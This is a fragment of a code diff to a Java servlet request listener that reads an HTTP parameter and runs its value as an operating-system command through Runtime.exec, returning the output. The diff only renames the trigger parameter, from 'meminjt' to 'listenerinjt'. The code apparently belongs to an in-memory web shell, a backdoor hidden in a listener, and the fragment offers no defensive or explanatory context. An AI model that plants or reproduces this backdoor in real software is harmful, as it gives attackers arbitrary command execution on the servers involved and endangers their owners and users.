@@ -28,7 +28,7 @@
                 System.out.println("requestInitialized");
                 ServletRequest request = sret.getServletRequest();
                 ServletOutputStream out = this.response.getOutputStream();
-                String cmds = request.getParameter("meminjt");
+                String cmds = request.getParameter("listenerinjt");
                 if (cmds != null) {
                     InputStream in = Runtime.getRuntime().exec(cmds.split(" ")).getInputStream();
                     StringBuilder sb = new StringBuilder();
